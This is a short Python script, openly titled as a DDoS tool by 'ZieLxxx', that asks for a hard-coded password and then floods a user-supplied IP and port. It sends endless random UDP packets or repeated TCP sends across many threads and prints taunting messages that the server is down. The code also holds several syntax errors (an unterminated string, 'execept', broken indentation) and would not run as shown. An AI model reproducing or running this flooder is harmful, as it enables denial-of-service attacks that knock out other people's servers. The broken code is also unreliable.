#!/usr/bin/env python3
#DDoS Tools By : ZieLxxx
#HAI KANG RENAME
import random
import socket
import time
import threading
import os
import sys

os.system("clear")
print("\033[93m")
Password = input("Account Passsword : ")

if Password=="DDOS-SAMP":
    print(f"""
Your Account Has Been Verified!!!
     "")
     print('''\033[94m ===Tools DDoS By ZieLxxx===

 ▄▀▀▀▀▄   ▄▀▀█▀▄   ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀▄  ▄▀▄  ▄▀▀▄  ▄▀▄  ▄▀▀▄  ▄▀▄ 
█     ▄▀ █   █  █ ▐  ▄▀   ▐ █    █  █    █   █ █    █   █ █    █   █ 
▐ ▄▄▀▀   ▐   █  ▐   █▄▄▄▄▄  ▐    █  ▐     ▀▄▀  ▐     ▀▄▀  ▐     ▀▄▀  
  █          █      █    ▌      █        ▄▀ █       ▄▀ █       ▄▀ █  
   ▀▄▄▄▄▀ ▄▀▀▀▀▀▄  ▄▀▄▄▄▄     ▄▀▄▄▄▄▄▄▀ █  ▄▀      █  ▄▀      █  ▄▀  
       ▐ █       █ █    ▐     █       ▄▀  ▄▀     ▄▀  ▄▀     ▄▀  ▄▀   
         ▐       ▐ ▐          ▐      █    ▐     █    ▐     █    ▐    ''')

ip = str(input("TARGET IP : "))
port = int(input("TARGET PORT : "))
times = int(input("PACKET : "))
threads = int(input("THREADS : "))
choice = str(input("GAS ? (y/n) : "))
def run():
       data = random._urandom(1024)
       i = random.choice(("[-]","[!]","[$]"))
       while True:
               try:
                       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                       addr = (str(ip),int(port))
                       for x in range (times):
                               s.sendto(data,addr)
                       print(i +" ZIELXXX ATTACK THIS SERVER!!!")
                except:
                       print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")

def run2():
        data = random._urandom(16)
        i = random.choice(("[-]","[!]",[$]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" ZIELXXX ATTACK THIS SERVER!!!")
                execept:
                        s.close()
                        print("[X] ERROR, THIS SERVER HAS BEEN DOWN!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
